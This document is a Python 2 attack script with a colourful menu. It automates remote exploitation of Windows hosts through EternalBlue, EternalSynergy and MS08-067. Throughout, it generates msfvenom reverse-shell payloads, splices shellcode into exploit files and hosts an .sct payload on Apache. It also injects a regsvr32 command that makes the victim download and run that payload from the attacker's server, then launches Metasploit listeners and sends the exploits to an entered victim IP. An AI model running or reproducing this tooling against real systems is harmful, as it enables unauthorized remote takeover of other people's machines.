#!/usr/bin/python

import sys
import socket
import subprocess
import time
import os
from time import *
from impacket import smb
from struct import pack

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
C  = '\033[36m' # cyan
P  = '\033[35m' # purple
B  = '\033[34m' # blue
GR = '\033[37m' # gray
Y  = '\033[93m' # yellow

#----------------------------------- Try Harder!

def tryharder():

	os.system('clear')
	print "\n"
	print Y+" [>] Invalid choice, try harder... \n"
	sleep(3)

# Remove all created files

def cleanup():
	os.system('rm *.bin config.rc')

def cleanupXP():
	os.system('rm ms08-067.py config.rc')

def cleanupSYN():
	os.system('rm synergy.py config.rc index.sct')
	os.system('rm /var/www/html/index.sct')


#----------------------------------- Banners!

def windows():
  
        print C+"\n        +-++-++-++-++-++-++-+ +-+ +-+ +-++-++-++-++-+"
        print C+"        |W||I||N||D||O||W||S| |*| |*| |S||U||C||K||S|"
        print C+"        +-++-++-++-++-++-++-+ +-+ +-+ +-++-++-++-++-+\n"
        print R+"                 Author: Scr1p7 K1dd13"
	print R+"		     Version: 1.0\n"

def banner():
  
        print B+"\n        +-++-++-++-++-++-++-+ +-+ +-+ +-++-++-++-++-+"
        print B+"        |W||I||N||D||O||W||S| |*| |*| |H||A||C||K||S|"
        print B+"        +-++-++-++-++-++-++-+ +-+ +-+ +-++-++-++-++-+\n"
        print R+"                 Author: Scr1p7 K1dd13"
	print R+"		     Version: 1.0\n"

def shells():
  
        print O+"\n        +-++-++-++-++-++-++-+ +-+ +-+ +-++-++-++-++-+"
        print O+"        |E||B|| ||S||H||E||L||L|| ||C|R|E|A|T|I|O||N|"
        print O+"        +-++-++-++-++-++-++-+ +-+ +-+ +-++-++-++-++-+\n"

def listen():
  
        print Y+"\n        +-++-++-++-++-++-++-+ +-+ +-+ +-++-++-++-++-+"
        print Y+"        |L||I||S||T||E||N||E||R|| ||C|R|E|A|T|I|O||N|"
        print Y+"        +-++-++-++-++-++-++-+ +-+ +-+ +-++-++-++-++-+\n"

def synergy():
  
        print G+"\n        +-++-++-++-++-++-++-+ +-+ +-+ +-++-++-++-++-+"
        print G+"        |E||T||E||R||N||A||L|| ||*|| |S|Y|N|E|R|G||Y|"
        print G+"        +-++-++-++-++-++-++-+ +-+ +-+ +-++-++-++-++-+\n"

def xp_banner():
  
        print GR+"\n        +-++-++-++-++-++-++-+ +-+ +-+ +-++-++-++-++-+"
        print GR+"        | *||M||S||0||8|| ||0||6||7|| |W|I|N|X|P||*|"
        print GR+"        +-++-++-++-++-++-++-+ +-+ +-+ +-++-++-++-++-+\n"

def check():
  
        print P+"\n        +-++-++-++-++-++-++-+ +-+ +-+ +-++-++-++-++-+"
        print P+"        |E||B|| |*| |V||U||L||N| |*| |C|H|E||C||K||S|"
        print P+"        +-++-++-++-++-++-++-+ +-+ +-+ +-++-++-++-++-+\n"
        print R+"                 Author: Scr1p7 K1dd13"
	print R+"		     Version: 1.0\n"

#----------------------------------- Menus!

# This is the first menu when the script runs

def main_menu():

	os.system('clear')
	banner()
	print G+" Select what you would like to do\n"
	print G+" [>] 1. Check for the Eternal Blue vulnerability"
	print G+" [>] 2. Exploit a windows machine"
	print G+" [>] 3. Exit"

	try:
		choice = raw_input(C+"\n [>] Enter your choice: ")

	except KeyboardInterrupt:
		print R+"\n [>] Exiting!\n"
		sleep(1)
		sys.exit()

	if len(choice) > 2:
		tryharder()
		main_menu()

	elif choice =="1":
		try:
			check_menu()
		except KeyboardInterrupt:
			print R+"\n [>] Exiting!\n"
			sleep(1)
			sys.exit()

	elif choice =="2":
		try:
			windows_menu()
		except KeyboardInterrupt:
			print R+"\n [>] Exiting!\n"
			sleep(1)
			sys.exit()

	elif choice == "3":
		print R+"\n [>] Exiting\n"
		sleep(1)
		sys.exit()

	else:
		tryharder()
		main_menu()

# This will run the MS17-010 check against an IP

def check_menu():

	os.system('clear')
	check()

	try:
		IP = raw_input(B+"\n [>] Please enter the IP you would like to scan: ")

	except KeyboardInterrupt:
		print R+"\n [>] Exiting!\n"
		sleep(1)
		sys.exit()

	os.system('clear && ./ms17-010_check.py %s' % IP)
	sleep(7)
	main_menu()

# This menu is for windows choice selection

def windows_menu():

	os.system('clear')
	windows()
	print Y+" Windows Operating System choices\n"
	print Y+" [>] 1. Windows 2012 R2, WIndows 8.1 or Windows 10 Pro (Eternal Blue)"
	print Y+" [>] 2. Windows 7 or Windows 2008 (Eternal Blue)"
	print Y+" [>] 3. Windows Server 2012 or 2016 with Synergy (Eternal Synergy)"
	print Y+" [>] 4. Windows MS08-067"
	print Y+" [>] 5. Main menu"

	try:
		choice = raw_input(G+"\n [>] Enter your choice: ")

	except KeyboardInterrupt:
		print R+"\n [>] Exiting!\n"
		sleep(1)
		sys.exit()

	if len(choice) > 4:
		tryharder()
		windows_menu()

	elif choice == "1":
		try:
			eternal8()
		except KeyboardInterrupt:
			print R+"\n [>] Exiting!\n"
			sleep(1)
			sys.exit()

	elif choice == "2":
		try:
			eternal7()
		except KeyboardInterrupt:
			print R+"\n [>] Exiting!\n"
			sleep(1)
			sys.exit()

	elif choice == "3":
		try:
			eternal_synergy()
		except KeyboardInterrupt:
			print R+"\n Exiting!\n"
			sleep(1)
			sys.exit()

	elif choice == "4":
		try:
			xp()
		except KeyboardInterrupt:
			print R+"\n Exiting!\n"
			sleep(1)
			sys.exit()

	elif choice =="5":
		try:
			main_menu()
		except KeyboardInterrupt:
			print R+"\n [>] Exiting!\n"
			sleep(1)
			sys.exit()

	else:
		tryharder()
		windows_menu()

#----------------------------------- Shellcodes!

# XP shellcode

def local_xp():

	os.system('clear')
	xp_banner()

	# Ask the user for pertinent information for the exploit

	try:

		global lhost3
		lhost3 = raw_input(C+"What is the IP you want to receive your shell on: ")
		global lport3
		lport3 = raw_input(C+"What is the port you want to listen: ")

	except KeyboardInterrupt:
		print R+"\n Exiting!\n"
		sleep(1)
		sys.exit()

	os.system('clear')
	xp_banner()

	try:
		print B+"Creating payload for XP exploitation.\n"
		os.system('msfvenom -p windows/shell_reverse_tcp --nopsled 62 LHOST=%s LPORT=%s  EXITFUNC=thread -b "\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40" -f c > shellcode.txt' % (lhost3, lport3))
		print B+"Placing shellcode in the exploit code.\n"
		sleep(2)
		os.system("sed -i '1d' shellcode.txt && sed -i -e 's/;/)/g' shellcode.txt")
		os.system("sed -n '1,47p' ms08-067-shell.py > ms08-067.py")
		os.system("cat shellcode.txt >> ms08-067.py")
		os.system("sed -n '49,184p' ms08-067-shell.py >> ms08-067.py")
		os.system("rm shellcode.txt")
		os.system("chmod +x ms08-067.py")
		print G+"Exploit code completed successfully!\n"
		sleep(2)

	except KeyboardInterrupt:
		print R+"\nExiting!\n"
		sleep(1)
		sys.exit()

# Eternal Synergy Shellcode

def local_syn():

	os.system('clear')
	xp_banner()

	# Ask the user for pertinent information for the exploit

	try:

		global lhost3
		lhost3 = raw_input(C+"What is the IP you want to receive your shell on: ")
		global lport3
		lport3 = raw_input(C+"What is the port you want to listen: ")

	except KeyboardInterrupt:
		print R+"\n Exiting!\n"
		sleep(1)
		sys.exit()

	os.system('clear')
	synergy()

	try:
		print B+"Creating payload for Eternal Synergy exploitation.\n"
		os.system('ruby ps1encode.rb --PAYLOAD windows/shell/reverse_tcp --LHOST=%s --LPORT=%s -t sct' % (lhost3, lport3))
		os.system('clear')
		print B+"Starting apache web server\n"
		os.system('/etc/init.d/apache2 start')
		sleep(2)
		os.system('clear')
		print B+"Copying index.sct file to /var/www/html location\n"
		os.system('cp index.sct /var/www/html && chmod +x /var/www/html/index.sct')
		print B+"Placing shellcode in the exploit code.\n"
		os.system("sed '920i\        print(\"Sending exploit command to target\")' ms17-010-shell.py > step2.py")
		os.system("sed \"921i\        service_exec(conn, r'regsvr32 /s /n /u /i:http://%s/index.sct scrobj.dll')\" step2.py > synergy.py" % lhost3)
		os.system('chmod +x synergy.py')
		sleep(2)
		os.system('rm step2.py')
		print G+"Exploit code completed successfully!\n"
		sleep(2)

	except KeyboardInterrupt:
		print R+"\nExiting!\n"
		sleep(1)
		sys.exit()

# Eternal Blue Shellcode

def eb_shell_creation():

	os.system('clear')
	shells()

	# Ask the user for pertinent information for the exploit

	try:

		global lhost
		lhost = raw_input(C+"What is the IP you want to receive your shell on: ")
		global lport1
		lport1 = raw_input(C+"What is the port you want to listen on for x64 Architecture: ")
		global lport2
		lport2 = raw_input(C+"What is the port you want to listen on for x86 Architecture: ")

	except KeyboardInterrupt:
		print R+"\n Exiting!\n"
		sleep(1)
		sys.exit()

	os.system('clear')
	shells()

	# Combine the shellcode together for Exploitation

	try:
		print C+"Creating the x64 Architecture bin files.\n"
		os.system('nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin')
		os.system('msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=%s LPORT=%s' % (lhost, lport1))
		print C+"Creating the x86 Architecture bin files.\n"
		os.system('nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin')
		os.system('msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=%s LPORT=%s' % (lhost, lport2))
		print C+"Combining the shellcode together.\n"
		os.system('cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin')
		os.system('cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin')
		os.system('python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin')
		print G+"Shellcode has been combined successfully!\n"
		sleep(2)

	except KeyboardInterrupt:
		print R+"\n Exiting!\n"
		sleep(1)
		sys.exit()

#----------------------------------- Listeners!

# Create a listener for Synergy Exploit

def msf_syn():
	os.system('clear')
	listen()

	try:
		print B+"Creating the Listeners for exploitation\n"
		os.system('touch config.rc')
		os.system('echo use exploit/multi/handler > config.rc')
		os.system('echo set PAYLOAD windows/shell/reverse_tcp >> config.rc')
		os.system('echo set LHOST %s >> config.rc' % lhost3)
		os.system('echo set LPORT %s >> config.rc' % lport3)
		os.system('echo set ExitOnSession false >> config.rc')
		os.system('echo set EXITFUNC thread >> config.rc')
		os.system('echo exploit -j >> config.rc')
		print B+"Starting metasploit listeners\n"
		os.system('/etc/init.d/postgresql start')
		os.system('gnome-terminal -e "msfconsole -r config.rc"')

	except KeyboardInterrupt:
		print R+"\n Exiting\n"
		sleep(1)
		sys.exit()

#create listener for XP

def msf_xp():
	os.system('clear')
	listen()

	try:
		print B+"Creating the Listeners for exploitation\n"
		os.system('touch config.rc')
		os.system('echo use exploit/multi/handler > config.rc')
		os.system('echo set PAYLOAD windows/shell_reverse_tcp >> config.rc')
		os.system('echo set LHOST %s >> config.rc' % lhost3)
		os.system('echo set LPORT %s >> config.rc' % lport3)
		os.system('echo set ExitOnSession false >> config.rc')
		os.system('echo set EXITFUNC thread >> config.rc')
		os.system('echo exploit -j >> config.rc')
		print B+"Starting metasploit listeners\n"
		os.system('/etc/init.d/postgresql start')
		os.system('gnome-terminal -e "msfconsole -r config.rc"')

	except KeyboardInterrupt:
		print R+"\n Exiting\n"
		sleep(1)
		sys.exit()

# Create the listeners and start the listeners for the exploitation

def msf_eb():

	os.system('clear')
	listen()

	try:
		print B+"Creating the Listeners for exploitation\n"
		os.system('touch config.rc')
		os.system('echo use exploit/multi/handler > config.rc')
		os.system('echo set PAYLOAD windows/x64/shell/reverse_tcp >> config.rc')
		os.system('echo set LHOST %s >> config.rc' % lhost)
		os.system('echo set LPORT %s >> config.rc' % lport1)
		os.system('echo set ExitOnSession false >> config.rc')
		os.system('echo set EXITFUNC thread >> config.rc')
		os.system('echo exploit -j >> config.rc')
		os.system('echo set PAYLOAD windows/shell/reverse_tcp >> config.rc')
		os.system('echo set LPORT %s >> config.rc' % lport2)
		os.system('echo exploit -j >> config.rc')
		print B+"Starting metasploit listeners\n"
		os.system('/etc/init.d/postgresql start')
		os.system('gnome-terminal -e "msfconsole -r config.rc"')

	except KeyboardInterrupt:
		print R+"\n Exiting\n"
		sleep(1)
		sys.exit()

# Conduct exploitation of Windows 7 or Windows 2008

def win7():

	os.system('clear')
	windows()

	try:
		sleep(10)
		victim = raw_input(B+"Please provide the IP you would like to exploit: ")
		groom = raw_input(B+"Please enter how many grooms you would like to use [10-14]: ")

	except KeyboardInterrupt:
		print R+"\n Exiting!\n"
		sleep(1)
		sys.exit()

	try:
		print C+"Sending your exploit to %s" % victim
		os.system('./eternalblue_exploit7.py %s sc_all.bin %s' % (victim, groom))
		print G+"Exploit completed! Check your listeners!"
		sleep(10)
		os.system('clear')
		cleanup()
		main_menu()

	except KeyboardInterrupt:
		print R+"\n Exiting!\n"
		sleep(1)
		sys.exit()


def win7_exploitation():

	os.system('clear')
	listen()

	try:
		msf_listen = raw_input(Y+"Would you like to start a listener [Y or N]: ")

	except KeyboardInterrupt:
		print "\n [>] Exiting!\n"
		sleep(1)
		sys.exit()

	if msf_listen == "Y":

		msf_eb()
		win7()

	elif msf_listen == "y":

		msf_eb()
		win7()

	elif msf_listen == "N":

		win7()

	elif msf_listen == "n":

		win7()

	else:
		tryharder()
		win7_exploitation()


# Conduct exploitation of Windows 2012 R2, WIndows 8.1 or Windows 10 Pro

def win8():

	os.system('clear')
	windows()

	try:
		sleep(10)
		victim = raw_input(B+"Please provide the IP you would like to exploit: ")
		groom = raw_input(B+"Please enter how many grooms you would like to use [10-14]: ")

	except KeyboardInterrupt:
		print R+"\n Exiting!\n"
		sleep(1)
		sys.exit()

	try:
		print C+"Sending your exploit to %s" % victim
		os.system('./eternalblue_exploit8.py %s sc_all.bin %s' % (victim, groom))
		print G+"Exploit completed! Check your listeners!"
		sleep(10)
		os.system('clear')
		cleanup()
		main_menu()

	except KeyboardInterrupt:
		print R+"\n Exiting!\n"
		sleep(1)
		sys.exit()

def win8_exploitation():

	os.system('clear')
	listen()

	try:
		msf_listen = raw_input(Y+"Would you like to start a listener [Y or N]: ")

	except KeyboardInterrupt:
		print "\n [>] Exiting!\n"
		sleep(1)
		sys.exit()

	if msf_listen == "Y":

		msf_eb()
		win8()

	elif msf_listen == "y":

		msf_eb()
		win8()

	elif msf_listen == "N":

		win8()

	elif msf_listen == "n":

		win8()

	else:
		tryharder()
		win8_exploitation()

# Conduct exploitation of Windows with Eternal Synergy

def win_server():

	os.system('clear')
	windows()

	try:
		sleep(10)
		victim = raw_input(B+"Please provide the IP you would like to exploit: ")
		pipe = raw_input(B+"If you are unsure how to answer this question please exit and run the MS17-010 check first.\n What named pipe would you like to exploit (ie. samr, spoolss): ")

	except KeyboardInterrupt:
		print R+"\n Exiting!\n"
		sleep(1)
		sys.exit()

	try:
		print C+"Sending your exploit to %s" % victim
		os.system('python synergy.py %s %s' % (victim, pipe))
		print G+"Exploit completed! Check your listener!"
		sleep(10)
		os.system('clear')
		cleanupSYN()
		main_menu()

	except KeyboardInterrupt:
		print R+"\n Exiting!\n"
		sleep(1)
		sys.exit()

def synergy_exploitation():

	os.system('clear')
	listen()

	try:
		msf_listen = raw_input(Y+"Would you like to start a listener [Y or N]: ")

	except KeyboardInterrupt:
		print "\n [>] Exiting!\n"
		sleep(1)
		sys.exit()

	if msf_listen == "Y":

		msf_syn()
		win_server()

	elif msf_listen == "y":

		msf_syn()
		win_server()

	elif msf_listen == "N":

		win_server()

	elif msf_listen == "n":

		win_server()

	else:
		tryharder()
		synergy_exploitation()

# Conduct exploitation of Windows XP

def winXP():

	os.system('clear')
	windows()

	try:
		sleep(10)
		victim = raw_input(B+"Please provide the IP you would like to exploit: ")

	except KeyboardInterrupt:
		print R+"\n Exiting!\n"
		sleep(1)
		sys.exit()

	print Y+" Which version of XP are you going to Exploit\n"
	print Y+" [>] 1. Windows XP SP0/SP1 Universal"
	print Y+" [>] 2. Windows 2000 Universal"
	print Y+" [>] 3. Windows 2003 SP0 Universal"
	print Y+" [>] 4. Windows 2003 SP1 English"
	print Y+" [>] 5. Windows XP SP3 French (NX)"
	print Y+" [>] 6. Windows XP SP3 English (NX)"
	print Y+" [>] 7. Windows XP SP3 English (AlwaysOn NX)\n"

	try:		

		version = raw_input(Y+"What version of Windows XP would you like to exploit: ")

	except KeyboardInterrupt:
		print R+"\n [>] Exiting!\n"
		sleep(1)
		sys.exit()

	if len(version) > 6:
		tryharder()
		winXP()

	else:
		print C+"Sending your exploit to %s" % victim
		os.system('python ms08-067.py %s %s' % (victim, version))
		print G+"Exploit completed! Check your listener!"
		sleep(10)
		os.system('clear')
		cleanupXP()
		main_menu()

def winxp_exploitation():

	os.system('clear')
	listen()

	try:
		msf_listen = raw_input(Y+"Would you like to start a listener [Y or N]: ")

	except KeyboardInterrupt:
		print "\n [>] Exiting!\n"
		sleep(1)
		sys.exit()

	if msf_listen == "Y":

		msf_xp()
		winXP()

	elif msf_listen == "y":

		msf_xp()
		winXP()

	elif msf_listen == "N":

		winXP()

	elif msf_listen == "n":

		winXP()

	else:
		tryharder()
		winxp_exploitation()

# Function for Windows 7 or Windows 2008 exploitation		

def eternal7():
	eb_shell_creation()
	win7_exploitation()

# Function for Windows 2012 R2, WIndows 8.1 or Windows 10 Pro exploitation

def eternal8():
	eb_shell_creation()
	win8_exploitation()

# Function for Windows Eternal Synergy

def eternal_synergy():
	local_syn()
	synergy_exploitation()

# Function for Windows 2012 R2, WIndows 8.1 or Windows 10 Pro exploitation

def xp():
	local_xp()
	winxp_exploitation()

main_menu()